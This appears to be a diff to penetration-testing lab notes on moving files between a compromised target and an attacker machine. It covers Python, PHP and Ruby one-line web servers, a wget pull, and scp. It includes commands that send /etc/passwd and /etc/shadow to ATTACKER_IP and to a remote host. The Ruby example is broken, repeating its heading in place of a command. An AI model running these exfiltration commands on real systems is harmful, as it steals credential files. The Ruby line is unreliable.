@@ -115,3 +115,36 @@ From the target/compromised machine upload the /etc/passwd and /etc/shadow files
 curl -X POST https://ATTACKER_IP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 	- used the --insecure option because we used a self-signed cert we trust
+
+#### Alternative Web File Transfer Method
+
+**Creating a Web Server with Python3**
+```
+python3 -m http.server
+```
+
+**Creating a Web Server with Python2.7**
+```
+python2.7 -m SimpleHTTPServer
+```
+
+**Creating a Web Server with PHP**
+```
+php -S 0.0.0.0:8000
+```
+
+**Creating a Web Server with Ruby**
+```
+Creating a Web Server with Ruby
+```
+
+**Download the File from the Target Machine onto the Pwnbox**
+```
+wget 192.168.49.128:8000/filetotransfer.txt
+```
+
+**File Upload using SCP**
+```
+scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
+```
+
